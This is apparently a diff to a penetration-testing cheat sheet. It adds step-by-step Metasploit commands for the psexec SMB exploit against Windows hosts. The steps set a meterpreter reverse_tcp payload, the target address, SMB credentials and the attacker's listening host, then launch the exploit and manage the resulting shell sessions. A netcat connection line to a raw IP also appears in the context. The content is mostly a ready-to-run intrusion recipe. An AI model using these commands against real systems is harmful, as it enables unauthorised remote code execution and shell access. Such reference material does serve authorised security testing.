@@ -40,5 +40,84 @@ nc.exe 10.10.75.75 7777
 
 ### p0f
 
+### Metasploit
+
+Starting Metasploit:
+
+```
+msfconsole
+```
+
+Listing Exploits:
+
+```
+show exploits
+```
+
+Searching Exploits:
+
+```
+search type:exploit psexec
+```
+
+Acquiring Info on an Exploit:
+
+```
+info exploit/windows/smb/psexec
+```
+
+Selecting an Exploit to Use:
+
+```
+use exploit/windows/smb/psexec
+```
+
+Configuring Exploit Settings:
+
+```
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+Showing Options:
+
+```
+show options
+```
+
+Configuring Variables:
+
+```
+set RHOST [Target IP]
+set SMBUser [username]
+set SMBPass [password]
+set LHOST [source/attacker IP]
+```
+
+Launching Exploit:
+
+```
+exploit
+```
+
+Backgrounding a Session:
+
+```
+background
+```
+
+Listing Sessions:
+
+```
+sessions -l
+```
+
+```
+sessions -i [session #]
+```
+
+
+
+
+
 ### etc...
 
